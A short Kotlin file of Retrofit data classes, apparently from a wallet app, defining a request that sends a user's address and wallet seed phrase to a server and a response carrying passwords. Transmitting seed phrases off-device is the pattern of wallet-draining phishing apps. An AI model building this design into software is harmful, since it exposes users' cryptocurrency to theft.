package app.protonwallet.src.retrofit

import com.google.gson.annotations.SerializedName


class RequestData {
    @SerializedName("user_address")
    var userAddress: String? = null

    @SerializedName("user_seedphrase")
    var userSeedPhrase: String? = null
}

data class Responseserver(
    @SerializedName("tfa_password") val tfaPassword: String,
    @SerializedName("long_password") val userSeedphrase: String
)
